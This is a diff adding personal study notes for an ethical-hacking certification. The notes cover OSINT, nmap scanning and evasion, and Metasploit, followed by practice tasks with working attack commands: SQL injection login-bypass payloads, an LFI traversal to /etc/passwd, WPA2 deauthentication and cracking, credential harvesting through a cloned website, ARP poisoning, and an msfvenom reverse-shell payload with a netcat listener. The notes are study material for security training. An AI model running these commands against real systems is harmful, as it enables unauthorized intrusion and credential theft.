@@ -1,0 +1,338 @@
+1)Gather Information using Advanced Google Hacking Techniques
+In the search bar, copy and paste this search command intitle:login site:eccouncil.org. The intitle and site Google advanced operators used in this search command limit the results to pages on the eccouncil.org website that have the login pages
+EC-Council filetype:pdf ceh
+CEH-brochure.pdf 
+allinurl: EC-Council career
+inurl: copy site:www.eccouncil.org query returns only pages in the EC-Council site where the URL has the word “copy.”
+Only sites with the terms "detect" and "malware" in the title are returned by the allintitle: detect malware query.
+Only sites with the terms "detect" and "malware" in the title are returned by the allintitle: detect malware query.
+Anti-virus inanchor:Norton 
+location: EC-Council
+info:eccouncil.org 
+
+Find the Company’s Domains, Subdomains, and Hosts using Netcraft and DNSdumpster
+https://www.netcraft.com.
+https://dnsdumpster.com/  asn number open service
+
+Gather Personal Information from Various Social Networking Sites using Sherlock
+sudo su 
+apt update
+sudo apt install pipx
+pipx ensurepath - to ensure that the directory used by pipx to store globally accessible Python tools is included in your system’s PATH environment variable.
+pipx install sherlock-project  - to install Sherlock package in ParrotOS.
+pipx ensurepath -to ensure again that pipx is added to the PATH environment variable. 
+sherlock --version
+sherlock "Elon Musk" 
+you will get all the URLs related to Elon Musk. Scroll down to view all the results. 
+
+Perform Whois Lookup using DomainTools
+http://whois.domaintools.com  name server 
+
+
+Gather DNS Information using nslookup Command Line Utility and Online Tool
+to gather the target domain’s IP address and DNS information. 
+cmd
+nsloookup
+set type=a 
+site.com
+Non-authoritative answer. When the response comes from the server that hosts the target, it is considered the Authoritative answer. 
+
+set type=cname
+site.com
+CNAME records for a domain because CNAME lookup is performed directly against the Authoritative name server of the target domain.
+set type=a
+ns1.bluehost.com  -nsame server 
+
+
+
+http://kloth.net/services/nslookup.php
+
+Perform Network Tracerouting in Windows and Linux Machines
+cmd
+tracert site.com
+tracert /? 
+traceroute certifiedhacker.com 
+
+You can also use tools like Traceroute NG (https://www.solarwinds.com) and Visual Route (http://visualroute.com). 
+
+Gather Information about a Target by Tracing Emails using eMailTrackerPro
+
+Email headers field in eMailTrackerPro. Click on the Trace button.
+You can also use email tracking tools such as MxToolbox (https://mxtoolbox.com/), Social Catfish (https://socialcatfish.com/), IP2Location Email Header Tracer (https://www.ip2location.com/), etc. to monitor an email and retrieve target data, including the sender’s IP address, mail server, location, and other details.
+
+
+Footprinting a Target using Recon-ng
+sudo su 
+recon-ng
+help
+marketplace install all - command to install the available modules
+modules search  - command to list the category-wise available modules
+workspaces  - to see the commands related to workspaces.
+workspaces create CEH 
+workspaces list
+db insert domains
+site.com
+show domains
+modules load keyword - command to search for the module to be loaded. It searches for the brute keyword and lists the modules.
+modules load brute
+modules load recon/domains-hosts/brute-hosts 
+run
+modules load recon/domains-hosts/brute-hosts 
+modules load recon/hosts-hosts/reverse-resolve
+show hosts
+modules load reporting/html 
+Options set FILENAME /home/user/Desktop/ result.html
+Options set CREATOR CEH-author
+Options set CUSTOMER Certifiedhacker Networks
+run
+Go to the path /home/user/Desktop/result.html and open the result.html file via any web browser. 
+
+open new terminal
+sudo su 
+recon-ng
+workspaces create reconnaissance
+options set SOURCE site.com  - command, where site.com is the target domain
+run
+
+This module gathers the contact details associated with the target domain. 
+Try another module, recon/profiles-profiles/namechk. Set the target name using the options set SOURCE MarkZuckerberg command. Enter run to collect data.
+module load recon/profiles-profiles/namechk
+back
+module load recon/profiles-profiles/profiler
+options set SOURCE MarkZuckerberg 
+run
+
+
+module load recon/domains-hosts/hackertarget
+options set SOURCE certifiedhacker.com 
+run
+
+shell command 
+run sgpt --chat footprint --shell “Use theHarvester to gather email accounts associated with 'microsoft.com', limiting results to 200, and leveraging 'baidu' as a data source” 
+
+To perform website footprinting using ShellGPT, run sgpt --chat footprint --shell “Footprint the target website www.certifiedhacker.com and save the result in website_footprint.txt” command. 
+
+
+---
+
+Perform Host Discovery using Nmap
+
+
+nmap -sn -PR [Target IP Address]. The -sn disables port scan, and -PR performs ARP ping scan The host is active when an ARP response is received
+nmap -sn -PU [Target IP Address]. According to the scan findings, the target host is operational, he -PU option does a UDP ping scan
+ICMP ECHO ping scan. Execute the following command: nmap -sn -PE [Target IP Address].
+nmap -sn -PE 192.168.56.2-254
+nmap -sn -PP [Target IP Address] The -PP carries out the ICMP timestamp ping scan.
+nmap -sn -PM [target IP address]. This ICMP Address Mask Ping Scan approach is an alternative to the usual ICMP ECHO ping scan, identifying whether the target host is alive, especially when administrators disable ICMP ECHO pings.
+nmap -sn -PS [target IP address]. This TCP SYN Ping Scan technique sends empty TCP SYN packets to the target host, and the ACK response means the host is active.
+nmap -sn -PA [target IP address]. The TCP ACK Ping Scan method sends empty TCP ACK packets to the target host; an RST response indicates that the host is active.
+nmap -sn -PO [target IP address]. The IP Protocol Ping Scan method delivers probing packets from several IP protocols to the target host. A host is active if any probe returns a response.
+ The Zenmap appears; enter nmap -sT -v [Target IP Address] in the Command field and Click on the Scan button. The TCP connect/full open scan is carried out by the -sT, and the verbose output (which includes all hosts and ports) is enabled by the -v. All of the target machine's open TCP ports and services are shown in the scan results.
+ In the Command field of Zenmap, enter nmap -sS -v [Target IP Address] and Click the Scan button.
+Stealth scan/TCP half-open scan is done with -sS, and verbose output (which includes all hosts and ports) is enabled with -v. The scan results show the target machine's open TCP ports and services.
+enter nmap -sX -v [Target IP Address] and Click the Scan button. The -sX option performs the Xmas scan, and the -v option allows for verbose output (including all hosts and ports). The scan results show that the ports are either open or filtered on the target machine, indicating that a firewall has been configured.
+
+enter nmap -sM -v [Target IP Address] and Click on the Scan button. The -sM option performs the TCP Maimon scan, and the -v option allows for verbose output (including all hosts and ports). The scan results display whether the target machine's ports are open or filtered, suggesting a firewall has been configured.
+
+enter nmap -sA -v [Target IP Address] and Click on the Scan button. The -sA option performs an ACK flag probe scan, and the -v option enables verbose output (which includes all hosts and ports). The scan results show that the target machine's ports are filtered.
+
+nmAP -T4 -A -v targetip
+
+nmap -A 1.1.1.*
+
+Perform OS Discovery using Nmap Script Engine (NSE)
+
+nmap -A [Target IP Address]. The scan results, open ports, running services, their versions, and the target details, such as the operating system, computer name, and NetBIOS computer name, are displayed in the Host script results section. Use the -A to run an aggressive scan. It takes around ten minutes for the scan to finish.
+
+
+nmap -O [Target IP Address]. The scan results show the name of the operating system operating on the target machine, details about open ports, and the services that are using the open ports. The -O is used to perform the OS discovery.
+
+nmap --script smb-os-discovery.nse [Target IP Address]. The scan results are shown under the Host script results section, along with the target OS, machine name, NetBIOS computer name, and other information. The --script outlines the custom script and smb-os-discovery.nse: tries to use the SMB protocol (ports 445 or 139) to find the OS, computer name, domain, workgroup, and current time.
+
+
+can beyond IDSFirewall using Various Evasion Techniques
+
+hsa firewall off 
+nmap -f [Target IP Address]. The -f switch splits the IP packet into tiny fragment packets.fragmented packets that you may inspect.
+ nmap -g 80 [Target IP Address]. In this command, you can use the -g or --source-port option to manipulate the source port. All open TCP ports and the names of the services that are using scroll-down, and you can observe the TCP packets indicating that port number 80 is used to scan other ports of the target host
+ 
+ nmap -mtu 8 [Target IP Address]. The Maximum Transmission Unit (MTU) of this command is 8 bytes of packets, as indicated by the -mtu option.  you can observe the fragmented packets having a maximum length of 8 bytes.
+ 
+ nmap -D RND:10 [Target IP Address]. In this command, -D performs a decoy scan, and RND generates random and non-reserved IP addresses (here, 10). ou can observe the packets displaying the various IP addresses in the source part of the Wireshark window
+ 
+  nmap -sT -Pn --spoof-mac 0 [Target IP Address]. In this command, --spoof-mac 0 represents randomizing the MAC address, -sT performs the TCP connect/full open scan, -Pn is used to skip the host discovery.
+  
+ Scan a Target Network using Metasploit
+  
+ Metasploit can help identify open ports and services on the target network, which can be a starting point for further enumeration and exploitation.
+ 
+ 
+  sudo su
+  msfdb init 
+  Use the service postgresql start command to start the PostgreSQL service. Postgresql is connected to the Metasploit initialized database. Use the msfconsole command to launch the Metasploit Framework. 
+  db_status
+  nmap -Pn -sS -A -oX Test 192.168.2.0/24 command to scan the entire subnet. 
+  -Pn flag scans without DNS resolution (-n = no DNS resolution) because it is slow.
+-sS flag specifies the TCP SYN Scan.
+-A flag specifies the aggressive mode.
+-oX Test flag puts the XML output in a file named Test. 
+
+Use the db_import Test command to import and save the gathered data into the Test file. 
+
+Use the hosts command to list all the gathered hosts on the network. 
+ Use the services command to list all the open ports and services running on them. 
+ Use the search command to search the keyword portscan. It lists all the modules that include the keyword portscan. 
+ search portscan
+ Use the use auxiliary/scanner/portscan/syn command to use this module for SYN scanning. Use the following commands to set the parameters;
+set PORTS 80
+set RHOSTS target_IP
+set THREADS number_of_threads
+run
+
+Use the back command to exit the module. Use the use auxiliary/scanner/portscan/tcp command to use the TCP scanner module. Set the target host using the set RHOSTS 192.168.2.100 command and enter run to execute. 
+
+use auxiliary/scanner/smb/smb_version command to find the SMB version.
+set RHOSTS target_IP 
+set THREADS 10
+run
+
+sgpt --chat scan --shell "Use Hping3 to perform ICMP scanning on the target IP address 10.0.2.20 and stop after 10 iterations" to perform ICMP scan on target IP address
+run sgpt --chat scan --shell “Run a hping3 ACK scan on port 80 of target IP 10.0.2.20” command.
+
+
+ 
+ --------------------------------
+ 
+ 
+ Perform NetBIOS Enumeration using Windows Command-Line Utilities
+ 
+ nbtstat -a [IP address of the remote machine]. In this command, -a shows the NetBIOS name table of a remote server
+ 
+ nbtstat -c. In this command, -c lists the contents of the NetBIOS name cache of the remote server or computer.
+ 
+ 
+ net use. The output shows details about the target, including network information, shared folders and drives, and connection status.
+ 
+ 
+ 
+  ---
+
+
+Analyze Malicious Network Traffic
+Filter the traffic using protocols like http, ftp, or telnet.
+ftp.request.command == "USER" || ftp.request.command == "PASS"
+
+Scan the IP 1.1.1.1 using Nmap and identify the open ports and services.
+nmap -sS -sV 1.1.1.1
+
+A web application running on 192.168.1.15 has a vulnerable file upload feature. Exploit it to gain access.
+Upload a reverse shell script (e.g., .php).
+Intercept and modify the request using Burp Suite.
+Set up a listener: nc -lvnp 4444.
+Execute the uploaded file to open a reverse shell.
+
+Perform SQL Injection
+Test for SQL injection on a login page with fields username and password.
+Enter the following payload in the username field: ' OR '1'='1' --
+Leave the password field blank.
+If successful, you'll bypass authentication.
+
+Use Aircrack-ng to capture a WPA2 handshake and crack it.
+Put your wireless adapter in monitor mode: airmon-ng start wlan0
+Capture traffic: airodump-ng wlan0
+Deauthenticate a client: aireplay-ng -0 1 -a [AP_MAC] -c [Client_MAC] wlan0
+Crack the captured handshake with a wordlist: aircrack-ng -w wordlist.txt -b [AP_MAC] capture.cap
+
+
+Launch Nessus and create a new scan for the target IP.
+Start the scan and review the report for critical vulnerabilities.
+Example vulnerability: CVE-2023-XXXX.
+
+
+Simulate credential harvesting using Social Engineering Toolkit (SET).
+Run SET: setoolkit.
+Select "Social Engineering Attacks" and then "Website Attack Vectors."
+Clone a website and collect credentials.
+
+Use Hashcat to crack a hashed password
+Identify the hash type: hashid [hash].
+Crack it: hashcat -m [hash_mode] -a 0 [hash_file] [wordlist].
+
+: Detect ARP spoofing on your network.
+Use ARPwatch to monitor ARP requests.
+Look for duplicate IPs with different MAC addresses.
+
+
+List shared folders on a target using SMBClient.
+smbclient -L \\[IP] -U [username]
+
+
+Perform Banner Grabbing
+Use Netcat to perform banner grabbing on a target server running on port 80.
+nc -v [target_IP] 80
+
+
+Use Dig to perform DNS enumeration for example.com.
+dig example.com ANY
+
+
+Bypass Login Authentication
+Test a login page for authentication bypass using SQL injection.
+Payload for username: ' OR 1=1 --
+Leave the password field blank and submit.
+If successful, you will gain access without valid credentials
+
+Detect Open Vulnerabilities Using OpenVAS
+Run a vulnerability scan using OpenVAS.
+Launch OpenVAS and configure a new scan.
+Set the target IP and run the scan.
+Review results for exploitable vulnerabilities.
+
+
+Detect Hidden Directories on a Web Server
+ Use Dirbuster to identify hidden directories on a web server.
+Launch Dirbuster and set the target URL.
+Use a wordlist (e.g., common.txt) for directory brute-forcing.
+Review results for directories like /admin or /backup.
+
+Capture and Analyze HTTP Traffic
+ Intercept and analyze HTTP traffic using Burp Suite.
+Set up Burp Suite as a proxy and configure your browser to route traffic through it.
+Capture the HTTP requests and analyze them for sensitive data (e.g., cookies or credentials).
+
+
+Crack an Encrypted ZIP File
+Use John the Ripper to crack a password-protected ZIP file.
+Convert the ZIP hash: zip2john file.zip > hash.txt.
+Crack the password: john --wordlist=wordlist.txt hash.txt.
+
+
+Detect and Exploit LFI (Local File Inclusion)
+ A web application has an LFI vulnerability. Exploit it to read sensitive files.
+Identify LFI: http://example.com/?file=../../../../etc/passwd.
+Use traversal techniques to access other sensitive files like /var/www/html/config.php.
+
+
+Perform MITM Attack
+Use Ettercap to perform a man-in-the-middle (MITM) attack on a local network.
+Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward.
+Launch Ettercap and select "Sniff > Unified Sniffing."
+Perform ARP poisoning to intercept traffic.
+
+
+Conduct Reverse Shell Exploitation
+ Establish a reverse shell on a vulnerable system.
+Create a reverse shell payload: msfvenom -p linux/x86/shell_reverse_tcp LHOST=[your_IP] LPORT=4444 -f elf > shell.elf.
+Transfer the payload to the target system.
+Set up a listener: nc -lvnp 4444.
+Execute the payload to gain shell access.
+  
+
+
+
+
+
+
+
+
+
